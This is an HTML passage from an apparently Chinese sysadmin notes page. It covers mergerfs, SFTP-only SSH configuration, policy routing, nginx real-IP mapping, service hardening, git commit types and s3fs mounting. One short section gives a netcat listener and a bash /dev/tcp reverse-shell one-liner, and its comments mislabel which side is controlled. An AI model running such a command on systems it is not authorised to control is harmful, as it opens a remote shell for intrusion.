    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://wzyboy.im/post/1148.html"target="_blank" rel="external nofollow noopener noreferrer">https://wzyboy.im/post/1148.html<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<blockquote>
<p><a href="https://github.com/trapexit/mergerfs"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/trapexit/mergerfs<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<p>使用示例:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 挂载到的目录必须为空</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 命令挂载</span>
</span></span><span class="line"><span class="cl">$&gt; mergerfs -o defaults,allow_other,use_ino,minfreespace<span class="o">=</span>10G,ignorepponrename<span class="o">=</span><span class="nb">true</span> /data01:/data02 /shares
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># fstab</span>
</span></span><span class="line"><span class="cl">$&gt; /etc/fstab
</span></span><span class="line"><span class="cl">/data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace<span class="o">=</span>10G,ignorepponrename<span class="o">=</span><span class="nb">true</span> <span class="m">0</span> <span class="m">0</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="linux-sftp-搭建" class="heading-element"><span>linux sftp 搭建</span>
  <a href="#linux-sftp-%e6%90%ad%e5%bb%ba" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 编辑文件 /etc/ssh/sshd_config,末尾添加(新建的用户若仅使用sftp可以不指定可登陆的bash)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 若想要让sftp更像登陆到了服务器,可配合chroot来控制,当然也可以直接创建账号，但一般不建议</span>
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span><span class="line"><span class="cl">Match Group/User  www                          <span class="c1"># 限制某个组或者某个用户使用以下规则</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 仅允许使用sftp , -l INFO 表示记录 SFTP 的 INFO 级别日志。-f AUTH 指定 SFTP 鉴权日志级别为 AUTH</span>
</span></span><span class="line"><span class="cl">    ForceCommand internal-sftp -l INFO -f AUTH 
</span></span><span class="line"><span class="cl">    <span class="c1"># 禁止使用密码进行身份验证，只允许通过公钥认证</span>
</span></span><span class="line"><span class="cl">    PasswordAuthentication no   
</span></span><span class="line"><span class="cl">    <span class="c1"># 禁止 SSH 隧道功能</span>
</span></span><span class="line"><span class="cl">    PermitTunnel no
</span></span><span class="line"><span class="cl">    <span class="c1"># 禁止 SSH 代理转发 </span>
</span></span><span class="line"><span class="cl">    AllowAgentForwarding no
</span></span><span class="line"><span class="cl">    <span class="c1"># 禁止 TCP 转发</span>
</span></span><span class="line"><span class="cl">    AllowTcpForwarding no</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="监听本地网卡上没有的ip地址" class="heading-element"><span>监听本地网卡上没有的IP地址</span>
  <a href="#%e7%9b%91%e5%90%ac%e6%9c%ac%e5%9c%b0%e7%bd%91%e5%8d%a1%e4%b8%8a%e6%b2%a1%e6%9c%89%e7%9a%84ip%e5%9c%b0%e5%9d%80" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 一般用于 keepalive + nginx 使用</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;net.ipv4.ip_nonlocal_bind = 1&#39;</span> &gt;&gt; /etc/sysctl.conf</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="腾讯云第二块网卡绑定公网ip" class="heading-element"><span>腾讯云第二块网卡绑定公网ip</span>
  <a href="#%e8%85%be%e8%ae%af%e4%ba%91%e7%ac%ac%e4%ba%8c%e5%9d%97%e7%bd%91%e5%8d%a1%e7%bb%91%e5%ae%9a%e5%85%ac%e7%bd%91ip" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>官方文档是有记录的，这儿记录下服务器上的设置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 网卡初始化</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">DEVICE</span><span class="o">=</span>eth1
</span></span><span class="line"><span class="cl"><span class="nv">NM_CONTROLLED</span><span class="o">=</span>yes
</span></span><span class="line"><span class="cl"><span class="nv">ONBOOT</span><span class="o">=</span>yes
</span></span><span class="line"><span class="cl"><span class="nv">IPADDR</span><span class="o">=</span>&lt;网卡2IP&gt;
</span></span><span class="line"><span class="cl"><span class="nv">NETMASK</span><span class="o">=</span>255.255.240.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10 t1&#34;</span> &gt;&gt; /etc/iproute2/rt_tables
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;20 t2&#34;</span> &gt;&gt; /etc/iproute2/rt_tables
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/usr/sbin/ip route add default dev eth0 via 172.21.0.1 table <span class="m">10</span>
</span></span><span class="line"><span class="cl">/usr/sbin/ip route add default dev eth1 via 172.21.0.1 table <span class="m">20</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/usr/sbin/ip rule add from 172.21.2.168 table <span class="m">10</span>
</span></span><span class="line"><span class="cl">/usr/sbin/ip rule add from 172.21.2.74 table <span class="m">20</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="shell-反弹" class="heading-element"><span>shell 反弹</span>
  <a href="#shell-%e5%8f%8d%e5%bc%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://blog.csdn.net/weixin_41082546/article/details/104123131"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/weixin_41082546/article/details/104123131<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 被控端执行  </span>
</span></span><span class="line"><span class="cl">nc -lvp <span class="m">65535</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 控制端执行 </span>
</span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/&lt;被控端ip&gt;/65535 0&gt;<span class="p">&amp;</span><span class="m">1</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="nginx-获取cdn真实用户ip" class="heading-element"><span>nginx 获取cdn真实用户ip</span>
  <a href="#nginx-%e8%8e%b7%e5%8f%96cdn%e7%9c%9f%e5%ae%9e%e7%94%a8%e6%88%b7ip" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># client_real_ip 即为用户真实IP,可直接用于替换 remote_addr 
</span></span><span class="line"><span class="cl">    map $http_x_forwarded_for $client_real_ip {
</span></span><span class="line"><span class="cl">    &#34;&#34; $remote_addr;
</span></span><span class="line"><span class="cl">    # fix: 兼容ipv6
</span></span><span class="line"><span class="cl">    ~^(?P&lt;firstAddr&gt;[0-9a-fA-F:.]+),?.*$ $firstAddr;
</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="virtualbox---从主机端口80到virtualbox端口80的端口转发不起作用" class="heading-element"><span>virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用</span>
  <a href="#virtualbox---%e4%bb%8e%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a380%e5%88%b0virtualbox%e7%ab%af%e5%8f%a380%e7%9a%84%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91%e4%b8%8d%e8%b5%b7%e4%bd%9c%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>此次问题实际出现是在<code>windows</code>上, 理论上说<code>linux</code>下若使用<code>nat</code>功能可能也会出现该问题(至于为什么用<code>nat</code>,<code>virtualbox</code>似乎并不支持桥接网卡,因此要为虚拟机分配物理<code>ip</code>似乎就只能在物理机绑定多个<code>ip</code>,然后<code>nat</code>转发到虚拟机中), <code>virtualbox</code>在转发<code>80</code>端口时似乎会与物理机的<code>80</code>冲突,从而导致转发无效,这个可能是因为我物理机也启用了<code>IIS</code>的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案.</p>
<ul>
<li>解决方案</li>
</ul>
<ol>
<li>我是用的 <code>windows</code>的端口转发解决的, <code>virtualbox</code>在<code>nat</code>的时候转发一个其他端口(比如<code>8080</code>)到内部的<code>80</code>, 然后在<code>windows</code> 在进行一次转发,将绑定的<code>ip</code>的<code>80</code>端口转发到<code>8080</code>上,这样也可以解决,骚操作看 <a href="/2022/%e5%91%bd%e4%bb%a4%e6%94%b6%e9%9b%86/#3-windows-%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91"><code>windows命令收集</code>-<code>端口转发</code></a></li>
<li>还有个说的是用管理员身份运行<code>virtualbox</code>,也可以解决,不过我没有验证过</li>
</ol>
<blockquote>
<p><a href="https://www.coder.work/article/6503907"target="_blank" rel="external nofollow noopener noreferrer">https://www.coder.work/article/6503907<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<h2 id="服务器默认端口优化" class="heading-element"><span>服务器默认端口优化</span>
  <a href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bc%98%e5%8c%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>检查所有非22开启的端口：<code>netstat -lntp</code></li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; netstat -lntp
</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:25            0.0.0.0:*               LISTEN      1317/master         
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd           
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      1569/sshd           
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::1:25                  :::*                    LISTEN      1317/master         
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::111                  :::*                    LISTEN      1/systemd           
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      1569/sshd </span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>查询<code>/etc/services</code>下端口对应的服务：<code>grep -E &quot;25|111/&quot; /etc/services </code></li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; grep -E <span class="s2">&#34;\ 25/|\ 111/&#34;</span> /etc/services 
</span></span><span class="line"><span class="cl">smtp            25/tcp          mail
</span></span><span class="line"><span class="cl">smtp            25/udp          mail
</span></span><span class="line"><span class="cl">sunrpc          111/tcp         portmapper rpcbind      <span class="c1"># RPC 4.0 portmapper TCP</span>
</span></span><span class="line"><span class="cl">sunrpc          111/udp         portmapper rpcbind      <span class="c1"># RPC 4.0 portmapper UD</span></span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>检查服务的运行状态(第三列为服务名称)： <code>systemctl list-unit-files |grep -E &quot;rpcbind|portmapper|mail&quot;</code>, 若单个端口所映射的服务没有查询到，需要通过运行端口的<code>pid</code>去查询他具体是属于那个程序的，然后然后去查询具体的服务启动状态。</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; systemctl list-unit-files <span class="p">|</span>grep -E <span class="s2">&#34;rpcbind|portmapper|postfix&#34;</span>
</span></span><span class="line"><span class="cl">postfix.service                               enabled 
</span></span><span class="line"><span class="cl">rpcbind.service                               enabled 
</span></span><span class="line"><span class="cl">rpcbind.socket                                enabled 
</span></span><span class="line"><span class="cl">rpcbind.target                                static  
</span></span><span class="line"><span class="cl">$&gt; systemctl stop postfix.service rpcbind.service rpcbind.socket     <span class="c1"># 关闭启动的服务</span>
</span></span><span class="line"><span class="cl">$&gt; systemctl disable postfix.service rpcbind.service rpcbind.socket     <span class="c1"># 禁用开机启动</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="linux-下hosts文件和dns服务器的响应顺序" class="heading-element"><span>linux 下hosts文件和dns服务器的响应顺序</span>
  <a href="#linux-%e4%b8%8bhosts%e6%96%87%e4%bb%b6%e5%92%8cdns%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%9a%84%e5%93%8d%e5%ba%94%e9%a1%ba%e5%ba%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>通过修改 <code>/etc/nsswitch.conf</code> 进行更换 , 更换<code>/etc/nsswitch.conf: 86</code>中的<code>files</code>和<code>dns</code>的顺序即可</li>
</ul>
<h2 id="git-提交类型" class="heading-element"><span>git 提交类型</span>
  <a href="#git-%e6%8f%90%e4%ba%a4%e7%b1%bb%e5%9e%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><table>
  <thead>
      <tr>
          <th style="text-align: left">类型</th>
          <th style="text-align: left">描述</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><code>feat</code></td>
          <td style="text-align: left">新增 <code>feature</code></td>
      </tr>
      <tr>
          <td style="text-align: left"><code>fix</code></td>
          <td style="text-align: left">修复 <code>bug</code></td>
      </tr>
      <tr>
          <td style="text-align: left"><code>docs</code></td>
          <td style="text-align: left">仅仅修改了文档，比如<code>README</code>, <code>CHANGELOG</code>, <code>CONTRIBUTE</code>等等</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>style</code></td>
          <td style="text-align: left">仅仅修改了空格、格式缩进、都好等等，不改变代码逻辑</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>refactor</code></td>
          <td style="text-align: left">代码重构，没有加新功能或者修复<code>bug</code></td>
      </tr>
      <tr>
          <td style="text-align: left"><code>perf</code></td>
          <td style="text-align: left">优化相关，比如提升性能、体验</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>test</code></td>
          <td style="text-align: left">测试用例，包括单元测试、集成测试等</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>chore</code></td>
          <td style="text-align: left">改变构建流程、或者增加依赖库、工具等</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>revert</code></td>
          <td style="text-align: left">回滚到上一个版本</td>
      </tr>
  </tbody>
</table>
<h2 id="linux-通过s3fs挂载七牛云存储" class="heading-element"><span>linux 通过s3fs挂载七牛云存储</span>
  <a href="#linux-%e9%80%9a%e8%bf%87s3fs%e6%8c%82%e8%bd%bd%e4%b8%83%e7%89%9b%e4%ba%91%e5%ad%98%e5%82%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; sudo yum install epel-release
</span></span><span class="line"><span class="cl">$&gt; sudo yum install s3fs-fuse
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$&gt; <span class="nb">echo</span> AK:SK &gt; /mnt/.passwd-s3fs
</span></span><span class="line"><span class="cl">$&gt; chmod <span class="m">600</span> /mnt/.passwd-s3fs
</span></span><span class="line"><span class="cl">
